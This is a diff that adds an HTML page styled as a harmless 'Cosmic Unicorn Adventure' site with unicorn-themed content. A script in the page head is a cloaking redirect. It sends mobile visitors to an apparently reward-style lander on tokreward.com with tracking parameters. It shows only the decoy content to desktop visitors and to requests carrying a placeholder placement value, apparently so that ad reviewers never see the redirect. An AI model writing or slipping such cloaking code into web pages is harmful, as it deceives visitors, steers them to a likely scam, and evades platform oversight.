@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://tokreward.com/api/v5/entry?s1=${s}&ttclid=${ttclid}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Unicorn Adventure</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #ff69b4;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .unicorn-box {
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+        }
+        footer {
+            background-color: #4b0082;
+            color: white;
+            text-align: center;
+            padding: 10px;
+        }
+        a {
+            color: #ffff00;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to the Cosmic Unicorn Adventure!</h1>
+    </header>
+    <main>
+        <div class="unicorn-box">
+            <h2>Sparkle Magic</h2>
+            <p>Discover the enchanting world of unicorn sparkles!</p>
+        </div>
+        <div class="unicorn-box">
+            <h2>Rainbow Rides</h2>
+            <p>Embark on a magical journey across the rainbow bridge!</p>
+        </div>
+        <div class="unicorn-box">
+            <h2>Starlight Dreams</h2>
+            <p>Experience the wonder of unicorn dreams under the starry sky!</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Unicorn Adventure | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
